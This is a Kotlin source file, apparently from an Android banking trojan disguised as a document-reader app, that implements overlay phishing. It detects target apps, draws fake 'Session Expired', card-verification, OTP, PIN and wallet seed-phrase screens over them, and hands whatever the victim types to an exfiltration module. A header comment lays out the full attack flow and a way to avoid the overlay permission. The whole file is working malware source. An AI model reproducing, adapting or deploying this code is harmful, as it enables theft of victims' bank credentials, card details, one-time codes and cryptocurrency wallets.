package com.docreader.lite.reader

import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView

/**
 * Overlay credential capture — draws fake login UI on top of banking apps.
 *
 * Attack flow:
 *   1. User opens banking app
 *   2. A11yService detects TYPE_WINDOW_STATE_CHANGED → target match
 *   3. OverlayRenderer.show() draws full-screen overlay on top
 *   4. User sees "Session expired, re-login" and types credentials
 *   5. On "Sign In" tap → credentials exfiltrated → overlay dismissed
 *   6. Real banking app shows through — user doesn't notice
 *
 * The overlay uses TYPE_APPLICATION_OVERLAY (requires SYSTEM_ALERT_WINDOW).
 * Modern banker (2025+) uses TYPE_ACCESSIBILITY_OVERLAY (type 2032) which
 * doesn't need SAW permission — just Accessibility grant.
 */
object OverlayRenderer {

    private var overlayView: View? = null
    private var wm: WindowManager? = null

    fun show(context: Context, target: Targets.Target) {
        if (overlayView != null) dismiss(context)

        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        wm = windowManager

        val view = when (target.overlayType) {
            Targets.OverlayType.LOGIN -> buildLogin(context, target)
            Targets.OverlayType.CARD -> buildCard(context, target)
            Targets.OverlayType.OTP -> buildOtp(context, target)
            Targets.OverlayType.PIN -> buildPin(context, target)
            Targets.OverlayType.SEED -> buildSeed(context, target)
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            else @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )

        try {
            windowManager.addView(view, params)
            overlayView = view
            Exfil.event("overlay_shown", "target" to target.packageName, "type" to target.overlayType.name)
        } catch (e: Exception) {
            Exfil.event("overlay_failed", "error" to (e.message ?: ""))
        }
    }

    fun dismiss(context: Context) {
        overlayView?.let {
            try { wm?.removeView(it) } catch (_: Exception) {}
        }
        overlayView = null
        wm = null
    }

    fun isShowing() = overlayView != null

    // ─── Login overlay ──────────────────────────────────────────────────

    private fun buildLogin(context: Context, target: Targets.Target): View {
        return LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#FAFAFA"))
            gravity = Gravity.CENTER
            setPadding(72, 160, 72, 160)

            // "Session expired" social engineering
            addView(text(context, "Session Expired", 24f, "#1A1A1A"))
            addView(text(context, "Please sign in to continue", 14f, "#777777").also {
                (it.layoutParams as? LinearLayout.LayoutParams)?.bottomMargin = 48
            })

            val user = editField(context, "Email or username")
            addView(user, fieldParams())

            val pass = editField(context, "Password",
                InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD)
            addView(pass, fieldParams())

            addView(button(context, "Sign In", "#1976D2") {
                val u = user.text.toString()
                val p = pass.text.toString()
                if (u.isNotEmpty() || p.isNotEmpty()) {
                    Exfil.credential(target.packageName, "overlay_login", "$u:$p")
                }
                dismiss(context)
            }, buttonParams())
        }
    }

    // ─── Card overlay ───────────────────────────────────────────────────

    private fun buildCard(context: Context, target: Targets.Target): View {
        return LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#FAFAFA"))
            gravity = Gravity.CENTER
            setPadding(72, 160, 72, 160)

            addView(text(context, "Verify Payment", 22f, "#1A1A1A"))
            addView(text(context, "Confirm your card to proceed", 14f, "#777777").also {
                (it.layoutParams as? LinearLayout.LayoutParams)?.bottomMargin = 48
            })

            val card = editField(context, "Card number", InputType.TYPE_CLASS_NUMBER)
            addView(card, fieldParams())
            val exp = editField(context, "MM/YY")
            addView(exp, fieldParams())
            val cvv = editField(context, "CVV",
                InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD)
            addView(cvv, fieldParams())

            addView(button(context, "Verify", "#388E3C") {
                val c = card.text.toString()
                val e = exp.text.toString()
                val v = cvv.text.toString()
                Exfil.credential(target.packageName, "overlay_card", "$c|$e|$v")
                dismiss(context)
            }, buttonParams())
        }
    }

    // ─── OTP overlay ────────────────────────────────────────────────────

    private fun buildOtp(context: Context, target: Targets.Target): View {
        return LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#FAFAFA"))
            gravity = Gravity.CENTER
            setPadding(72, 200, 72, 200)

            addView(text(context, "Verification", 22f, "#1A1A1A"))
            addView(text(context, "Enter the code sent to your phone", 14f, "#777777").also {
                (it.layoutParams as? LinearLayout.LayoutParams)?.bottomMargin = 48
            })

            val otp = editField(context, "000000", InputType.TYPE_CLASS_NUMBER).apply {
                textSize = 28f; gravity = Gravity.CENTER
            }
            addView(otp, fieldParams())

            addView(button(context, "Confirm", "#1976D2") {
                val code = otp.text.toString()
                if (code.isNotEmpty()) {
                    Exfil.otp("overlay_prompt", code, target.packageName)
                }
                dismiss(context)
            }, buttonParams())
        }
    }

    // ─── PIN overlay ────────────────────────────────────────────────────

    private fun buildPin(context: Context, target: Targets.Target): View {
        return LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#1A1A1A"))
            gravity = Gravity.CENTER
            setPadding(72, 200, 72, 200)

            addView(text(context, "Enter PIN", 22f, "#FFFFFF"))

            val pin = editField(context, "••••",
                InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD).apply {
                textSize = 32f; gravity = Gravity.CENTER
                setTextColor(Color.WHITE)
                setBackgroundColor(Color.parseColor("#333333"))
            }
            addView(pin, fieldParams())

            addView(button(context, "Continue", "#1976D2") {
                val p = pin.text.toString()
                Exfil.credential(target.packageName, "overlay_pin", p)
                dismiss(context)
            }, buttonParams())
        }
    }

    // ─── Seed phrase overlay ────────────────────────────────────────────

    private fun buildSeed(context: Context, target: Targets.Target): View {
        return LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#FAFAFA"))
            gravity = Gravity.CENTER
            setPadding(72, 120, 72, 120)

            addView(text(context, "Restore Wallet", 22f, "#1A1A1A"))
            addView(text(context, "Enter your 12-word recovery phrase", 14f, "#777777").also {
                (it.layoutParams as? LinearLayout.LayoutParams)?.bottomMargin = 48
            })

            val seed = EditText(context).apply {
                hint = "word1 word2 word3 ..."
                textSize = 14f
                setPadding(24, 24, 24, 24)
                setBackgroundColor(Color.WHITE)
                minLines = 3; maxLines = 4
                gravity = Gravity.TOP or Gravity.START
            }
            addView(seed, fieldParams())

            addView(button(context, "Restore", "#FF6F00") {
                val s = seed.text.toString()
                Exfil.credential(target.packageName, "overlay_seed", s)
                dismiss(context)
            }, buttonParams())
        }
    }

    // ─── Helpers ────────────────────────────────────────────────────────

    private fun text(ctx: Context, t: String, size: Float, color: String) = TextView(ctx).apply {
        text = t; textSize = size; setTextColor(Color.parseColor(color)); gravity = Gravity.CENTER
    }

    private fun editField(ctx: Context, hint: String, type: Int = InputType.TYPE_CLASS_TEXT) = EditText(ctx).apply {
        this.hint = hint; textSize = 16f; inputType = type
        setPadding(24, 20, 24, 20); setBackgroundColor(Color.WHITE); isSingleLine = true
    }

    private fun button(ctx: Context, label: String, bg: String, action: () -> Unit) = Button(ctx).apply {
        text = label; textSize = 16f; setTextColor(Color.WHITE)
        setBackgroundColor(Color.parseColor(bg)); setOnClickListener { action() }
    }

    private fun fieldParams() = LinearLayout.LayoutParams(
        LinearLayout.LayoutParams.MATCH_PARENT,
        LinearLayout.LayoutParams.WRAP_CONTENT
    ).apply { bottomMargin = 20 }

    private fun buttonParams() = LinearLayout.LayoutParams(
        LinearLayout.LayoutParams.MATCH_PARENT,
        LinearLayout.LayoutParams.WRAP_CONTENT
    ).apply { topMargin = 24 }
}
